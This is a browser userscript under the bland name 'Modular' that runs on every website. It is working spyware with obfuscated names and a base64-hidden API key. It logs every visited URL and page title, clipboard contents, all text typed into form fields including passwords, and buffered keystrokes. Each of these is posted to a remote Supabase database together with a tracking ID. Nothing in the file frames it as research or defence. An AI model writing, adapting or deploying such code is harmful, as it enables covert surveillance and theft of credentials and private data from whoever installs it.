// ==UserScript==
// @name         Modular
// @namespace    http://your.namespace
// @version      1.0.0
// @description  Modular
// @match        *://*/*
// @grant        none
// @run-at       document-end
// ==/UserScript==

(async function () {
  const cfg = {
    a1: true,
    b2: true,
    c3: true,
    d4: true
  };

  const x1 = 'https://rjejpdzlnzuffrqwpziw.supabase.co';
  const x2 = [
    'ZXlKaGJHY2lPaUpJVXpJMU5pSXNJbXRwWkNJNkltVjVTak5EU2pNd1lYZEpaV0k1ZURSRWNYa3lZ',
    'V2hTT1U1SlFVSkpOVVZFWVdWbU1tWnJUVVZPYkZkRVpETkRWMDlHYzJSbFFXUmlZV3h0V1ZsVU9U',
    'ZGFXVWx2WTFsTFpsb3dZVGRJUkZsNmJtOHlSV3hHVjBwM1VWYzNObTFwWkZoU2NsbDNVVFJHYVdG',
    'QmRWRlJjVGs1Z1hHdExUVzF0VjJKWWMyWjZhVTl0VkRaV2RXbHFXbFZ2YmpsTFdXeFZVMkY2VmtG',
    'c2VURXhZekZrZUVkclFtWmxMV1ZEVUZKT1YxcHhRWFZqYW1GMVRucGFSMlV6V1ZkUldYQjVXVE5V',
    'TVVwU1ZtdE9WazF2V1hsb1NHZ3lXV2hXUkU1ck9Fbz0='
  ];
  const x3 = atob(x2.join(''));
  const x4 = '3530a193-6219-4bb7-b20b-ab80c54ddb3e';

  const x5 = {
    'apikey': x3,
    'Authorization': `Bearer ${x3}`,
    'Content-Type': 'application/json',
    'Prefer': 'return=minimal'
  };

  const now = () => new Date().toISOString();
  const loc1 = location.href;
  const loc2 = location.hostname;
  const loc3 = document.title;

  if (cfg.a1) await f2();
  if (cfg.b2) f3();
  if (cfg.c3) f4();
  if (cfg.d4) f5();

  /** URL Logger **/
  async function f2() {
    const d = {
      a: x4,
      b: loc1,
      c: loc2,
      d: loc3,
      e: now()
    };
    console.log('📤 f2:', d);
    try {
      await fetch(`${x1}/rest/v1/url_history`, {
        method: 'POST',
        headers: x5,
        body: JSON.stringify(d)
      });
    } catch (e) {
      console.error('❌ f2 failed:', e);
    }
  }

  /** Clipboard Logger **/
  function f3() {
    document.addEventListener('copy', async () => {
      try {
        const z = await navigator.clipboard.readText();
        if (!z) return;
        const d = {
          a: x4,
          b: z,
          c: loc1,
          d: now()
        };
        console.log('📤 f3:', d);
        await fetch(`${x1}/rest/v1/clipboard`, {
          method: 'POST',
          headers: x5,
          body: JSON.stringify(d)
        });
      } catch (e) {
        console.error('❌ f3 failed:', e);
      }
    });
  }

  /** Form Logger **/
  function f4() {
    document.addEventListener('input', async (e) => {
      const el = e.target;
      if (!el || !(el.tagName === 'INPUT' || el.tagName === 'TEXTAREA')) return;
      const d = {
        a: x4,
        b: el.name || el.id || 'x',
        c: el.value,
        d: loc1,
        e: now()
      };
      console.log('📤 f4:', d);
      try {
        await fetch(`${x1}/rest/v1/form_inputs`, {
          method: 'POST',
          headers: x5,
          body: JSON.stringify(d)
        });
      } catch (e) {
        console.error('❌ f4 failed:', e);
      }
    });
  }

  /** Keystroke Logger **/
  function f5() {
    let buf = '';
    let last = Date.now();
    let tmr = null;
    const delay = 10000;

    function flush() {
      if (!buf) return;
      const d = {
        a: x4,
        b: buf,
        c: loc1,
        d: now()
      };
      console.log('📤 f5:', d);
      fetch(`${x1}/rest/v1/keystrokes`, {
        method: 'POST',
        headers: x5,
        body: JSON.stringify(d)
      }).catch(console.error);
      buf = '';
    }

    function reset() {
      if (tmr) clearTimeout(tmr);
      tmr = setTimeout(() => {
        if (Date.now() - last >= delay) flush();
      }, delay);
    }

    document.addEventListener('keydown', (e) => {
      if (e.key.length === 1) {
        buf += e.key;
        last = Date.now();
        reset();
      }
    });

    window.addEventListener('beforeunload', () => {
      flush();
    });
  }
})();